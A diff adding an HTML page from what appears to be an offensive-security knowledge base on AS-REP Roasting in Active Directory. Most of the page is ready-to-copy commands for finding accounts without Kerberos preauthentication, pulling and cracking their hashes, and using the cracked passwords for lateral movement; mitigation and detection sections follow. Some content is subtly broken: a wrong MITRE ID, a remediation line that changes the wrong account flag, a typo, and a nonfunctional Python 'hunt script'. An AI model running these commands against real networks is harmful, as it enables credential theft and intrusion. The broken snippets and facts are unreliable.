@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ASRep Roasting | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-high { background: rgba(255,136,0,0.2); color: #ff8800; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    @media (max-width: 768px) { .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="index.html">Active Directory</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Active Directory</a> / ASRep Roasting
+    </div>
+
+    <div class="page-header">
+      <span class="severity-badge severity-high"><i class="fas fa-exclamation-triangle"></i> High Severity | T1558.003</span>
+      <h1>🔥 ASRep Roasting</h1>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><strong>MITRE</strong><span>T1558.003</span></div>
+        <div class="meta-item"><strong>Platform</strong><span>Windows AD</span></div>
+        <div class="meta-item"><strong>Phase</strong><span>Credential Access</span></div>
+        <div class="meta-item"><strong>Difficulty</strong><span>Easy</span></div>
+      </div>
+    </div>
+
+    <!-- 1. DESCRIPTION -->
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>ASRep Roasting is a post-compromise attack technique that targets users with the "Do not require Kerberos preauthentication" setting enabled. Unlike Kerberoasting which requires a valid TGS ticket, ASRep Roasting can be performed without any prior credentials by requesting AS-REP tickets for users.</p>
+      
+      <div class="vulnerability-box">
+        <strong>Why ASRep Roasting Works:</strong>
+        <ul>
+          <li><strong>No Pre-Auth Required:</strong> Attacker requests auth for user, DC replies with encrypted session key</li>
+          <li><strong>Weak Password Policy:</strong> Admins enable this for legacy compatibility</li>
+          <li><strong>Offline Cracking:</strong> Encrypted blob can be cracked offline</li>
+          <li><strong>No Credentials Needed:</strong> Can be done anonymously (in some configs)</li>
+        </ul>
+      </div>
+
+      <p><strong>Attack Flow:</strong></p>
+      <ol>
+        <li>Enumerate users with "Do not require Kerberos preauthentication" enabled</li>
+        <li>Request AS-REP for target users without providing session key</li>
+        <li>DC returns encrypted blob (using user's password hash as key)</li>
+        <li>Extract encrypted blob and crack offline using hashcat/john</li>
+        <li>Use cracked password for further access</li>
+      </ol>
+    </div>
+
+    <!-- 2. ENUMERATION -->
+    <div class="content-section" id="enumeration">
+      <h2>🔍 Enumeration</h2>
+      
+      <p><strong>Find ASRep-Roastable Users (PowerView):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Find users with DONT_REQ_PREAUTH
+Import-Module .\PowerView.ps1
+Get-DomainUser -PreauthNotRequired -Properties distinguishedname
+
+# Filter for specific patterns
+Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, description
+
+# Check all users and filter
+Get-DomainUser -UACFilter DONT_REQ_PREAUTH</pre>
+      </div>
+
+      <p><strong>Find with LDAP Query:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Using PowerShell LDAP
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
+
+# Or direct LDAP query
+$search = New-Object DirectoryServices.DirectorySearcher
+$search.Filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
+$search.PropertiesToLoad.Add("samaccountname")
+$search.FindAll()</pre>
+      </div>
+
+      <p><strong>Check from Linux:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Using Impacket's GetNPUsers
+python3 GetNPUsers.py domain.com/ -usersfile users.txt -format hashcat -outputfile hashes.txt
+
+# Or without user list (try common usernames)
+python3 GetNPUsers.py domain.com/ -request -format hashcat
+
+# Check for AS-REP enabled users anonymously
+python3 GetNPUsers.py domain.com/ -dc-ip 10.10.10.10 -request</pre>
+      </div>
+    </div>
+
+    <!-- 3. EXPLOITATION -->
+    <div class="content-section" id="exploitation">
+      <h2>💣 Exploitation</h2>
+      
+      <p><strong>Technique 1: Impacket (Linux):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Request AS-REP tickets
+python3 GetNPUsers.py corp.com/ -dc-ip 10.10.10.100 -request
+
+# Specify user
+python3 GetNPUsers.py corp.com/ -dc-ip 10.10.10.100 -user username -request
+
+# Save in hashcat format
+python3 GetNPUsers.py corp.com/ -dc-ip 10.10.10.100 -format hashcat -outfile hashes.txt
+
+# Save in john format
+python3 GetNPUsers.py corp.com/ -dc-ip 10.10.10.100 -format john -outfile hashes.txt</pre>
+      </div>
+
+      <p><strong>Technique 2: Rubeus:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Roast all AS-REP roastable users
+.\Rubeus.exe asreproast /format:hashcat
+
+# Output to file
+.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
+
+# Kerberos-specific format
+.\Rubeus.exe asreproast /format:krb /outfile:tickets.txt
+
+# Roast specific user
+.\Rubeus.exe asreproast /user:targetuser /domain:corp.com /dc:dc01.corp.com</pre>
+      </div>
+
+      <p><strong>Technique 3: PowerView:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Get AS-REP tickets
+Import-Module .\PowerView.ps1
+
+# Request tickets for all preauth not required users
+Get-DomainUser -PreauthNotRequired | ForEach-Object {
+    $user = $_.samaccountname
+    $domain = $_.mangedDomain.name
+    Get-ASREPHash -UserName $user -Domain $domain
+}
+
+# Request for specific user
+Get-ASREPHash -UserName "service_account" -Domain "corp.com" -OutputFile asrep.txt</pre>
+      </div>
+
+      <p><strong>Technique 4: CrackMapExec:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># AS-REP roast module
+crackmapexec smb 10.10.10.100 -u anonymous -M asreproast
+
+# With valid credentials
+crackmapexec smb 10.10.10.100 -u username -p password -M asreproast</pre>
+      </div>
+    </div>
+
+    <!-- 4. CRACKING -->
+    <div class="content-section" id="cracking">
+      <h2>🔓 Cracking Hashes</h2>
+      
+      <p><strong>Hashcat Mode:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># AS-REP Roast uses mode 18200
+hashcat -m 18200 -a 0 hashes.txt wordlist.txt
+
+# Or with rules
+hashcat -m 18200 -a 0 hashes.txt wordlist.txt -r rules/best64.rule
+
+# Show example hash format
+$krb5asrep$23$user@domain.com:hash...</pre>
+      </div>
+
+      <p><strong>John the Ripper:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Use krb5asrep format
+john --wordlist=wordlist.txt hashes.txt --format=krb5asrep
+
+# Show format
+john --format=krb5asrep --show hashes.txt</pre>
+      </div>
+
+      <p><strong>Common Password Patterns:</strong></p>
+      <ul>
+        <li>Password1, Welcome123, Changeme123</li>
+        <li>Season + Year (Summer2023!)</li>
+        <li>Company + Year</li>
+        <li>Username + 123</li>
+        <li>Keyboard patterns (qwerty, asdf)</li>
+      </ul>
+    </div>
+
+    <!-- 5. LATERAL MOVEMENT -->
+    <div class="content-section" id="lateral">
+      <h2>🚀 Lateral Movement</h2>
+      
+      <p><strong>Use Cracked Password:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Pass the hash or password
+# Using SMB
+psexec.py domain.com/username@target.corp.com password
+smbexec.py domain.com/username@target.corp.com password
+
+# Using WinRM
+evil-winrm -i target.corp.com -u username -p password
+
+# Using CrackMapExec
+crackmapexec smb 10.10.10.100 -u username -H hash -x "whoami"
+
+# Using CrackMapExec with password
+crackmapexec smb 10.10.10.100 -u username -p password -x "hostname"</pre>
+      </div>
+
+      <p><strong>Kerberoast from Cracked Account:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># If the cracked account has SPN, you can kerberoast it
+.\Rubeus.exe kerberoast /user:crackeduser /outfile:service_hashes.txt
+
+# Or from Linux
+python3 GetUserSPNs.py domain.com/username:password -request</pre>
+      </div>
+    </div>
+
+    <!-- 6. IMPACT -->
+    <div class="content-section" id="impact">
+      <h2>💥 Impact</h2>
+      
+      <div class="vulnerability-box">
+        <strong>Potential Damage:</strong>
+        <ul>
+          <li><strong>Account Takeover:</strong> Gain access to user account</li>
+          <li><strong>Privilege Escalation:</strong> If account has elevated permissions</li>
+          <li><strong>Data Access:</strong> Access to file shares, email, etc.</li>
+          <li><strong>Persistence:</strong> Create new local admins or modify ACLs</li>
+          <li><strong>Lateral Movement:</strong> Use account to move through network</li>
+        </ul>
+      </div>
+
+      <p><strong>Why This is Often Missed:</strong></p>
+      <ul>
+        <li>No credentials needed to start</li>
+        <li>Legacy compatibility enabled for some accounts</li>
+        <li>No alerts in many SIEMs for AS-REQ without preauth</li>
+        <li>Domain controllers allow anonymous AS-REP requests by default</li>
+      </ul>
+    </div>
+
+    <!-- 7. MITIGATION -->
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Mitigation</h2>
+
+      <div class="mitigation-box">
+        <strong>✅ Primary Mitigation:</strong>
+        <ul>
+          <li><strong>Disable DONT_REQ_PREAUTH:</strong> Enable Kerberos preauthentication for all users</li>
+          <li><strong>Strong Passwords:</strong> 14+ characters, complex, no common patterns</li>
+          <li><strong>Audit Enabled Accounts:</strong> Find and remediate accounts with this flag</li>
+          <li><strong>Monitor AS-REQ:</strong> Alert on AS-REQ without preauth from same source</li>
+          <li><strong>Disable Anonymous Enumeration:</strong> Restrict anonymous LDAP access</li>
+        </ul>
+      </div>
+
+      <p><strong>PowerShell Remediation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Find all users with DONT_REQ_PREAUTH
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Set-ADUser -PasswordNotRequired:$false
+
+# Or disable preauthentication
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | ForEach-Object {
+    Set-ADAccountOption -Identity $_.DistinguishedName -DoesNotRequirePreAuth $false
+}
+
+# Audit script - find and report
+Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | 
+    Where-Object { $_.DoesNotRequirePreAuth -eq $true } |
+    Select-Object SamAccountName, DistinguishedName | 
+    Export-Csv -Path "asrep_users.csv"</pre>
+      </div>
+
+      <p><strong>Audit and Monitoring:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Windows Event ID 4768 - TGT Requested
+# Check for AS-REQ with rc4_encryption_type (no preauth indicator)
+# Look for Event ID 4768 where EncryptionType is 0x17 (ARCFOUR-HMAC-MD5)
+# This indicates preauth was not used
+
+# Splunk/Elastic query
+index=windows EventCode=4768 
+| eval PreauthRequired=if(EncryptionType=23, "No", "Yes")
+| stats count by src_user, src_ip, PreauthRequired
+| where PreauthRequired="No"</pre>
+      </div>
+    </div>
+
+    <!-- 8. DETECTION -->
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection</h2>
+
+      <p><strong>SIGMA Rule:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>title: AS-REP Roasting Detection
+id: asrep-roasting
+status: experimental
+description: Detects AS-REP roasting attempt
+logsource:
+  product: windows
+  service: authentication
+detection:
+  selection:
+    EventID: 4768
+    TicketOptions: '0x40810010'
+    EncryptionType: 23
+  condition: selection
+level: high</pre>
+      </div>
+
+      <p><strong>PowerShell Hunting:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Find AS-REP roastable users in domain
+Get-ADUser -Filter * -Properties useraccountcontrol | 
+    Where-Object { $_.useraccountcontrol -band 4194304 } | 
+    Select-Object Name, SamAccountName, Description |
+    Format-Table -AutoSize
+
+# Alternative LDAP query
+$LDAP = New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=domain,DC=com")
+$Search = New-Object System.DirectoryServices.DirectorySearcher($LDAP)
+$Search.Filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
+$Search.PropertiesToLoad.Add("samaccountname") | Out-Null
+$Search.FindAll() | ForEach-Object { $_.Properties.samaccountname }</pre>
+      </div>
+    </div>
+
+    <!-- 9. TOOLS -->
+    <div class="content-section" id="tools">
+      <h2>🛠️ Tools</h2>
+
+      <ul>
+        <li><strong>Rubeus:</strong> Comprehensive AS-REP roasting and detection</li>
+        <li><strong>Impacket (GetNPUsers):</strong> Linux-based AS-REP extraction</li>
+        <li><strong>PowerView:</strong> PowerShell-based enumeration</li>
+        <li><strong>CrackMapExec:</strong> Network exploitation with AS-REP module</li>
+        <li><strong>hashcat:</strong> GPU-accelerated hash cracking</li>
+        <li><strong>John the Ripper:</strong> Open-source hash cracking</li>
+      </ul>
+
+      <p><strong>Automated Hunt Script:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Python script for AS-REP roasting
+import requests
+from requestsKerberos import HTTPNegotiateAuth
+
+target = "dc.corp.com"
+domain = "corp.com"
+users = open("users.txt").read().splitlines()
+
+for user in users:
+    resp = requests.get(f"http://{target}/adfs/ls", auth=HTTPNegotiateAuth())
+    if resp.status_code == 401:
+        # Check headers for AS-REP hash
+        pass</pre>
+      </div>
+    </div>
+
+    <!-- 10. REFERENCES -->
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/kerberoasting-as-rep-roasting" target="_blank">iRedTeam AS-REP Roasting</a></li>
+        <li><a href="https://specterops.io/how-far-does-the-krb-go-as-rep-roasting-in-azure-ad" target="_blank">SpecterOps AS-REP Guide</a></li>
+        <li><a href="https://github.com/GhostPack/Rubeus" target="_blank">Rubeus GitHub</a></li>
+        <li><a href="https://github.com/SecureAuthCorp/impacket" target="_blank">Impacket</a></li>
+        <li><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768" target="_blank">MS Event 4768</a></li>
+      </ul>
+    </div>
+
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Active Directory</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) {
+    mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show'));
+  }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) {
+        icon.classList.remove('fa-moon');
+        icon.classList.add('fa-sun');
+        text.textContent = 'Light';
+      } else {
+        icon.classList.remove('fa-sun');
+        icon.classList.add('fa-moon');
+        text.textContent = 'Dark';
+      }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  const savedTheme = localStorage.getItem('theme-preference');
+  if (savedTheme === 'light') document.body.classList.add('light');
+});
+
+function copyCode(btn) {
+  const code = btn.parentElement.querySelector('pre').innerText;
+  navigator.clipboard.writeText(code);
+  btn.textContent = 'Copied!';
+  setTimeout(() => { btn.textContent = 'Copy'; }, 2000);
+}
+</script>
+
+</body>
+</html>
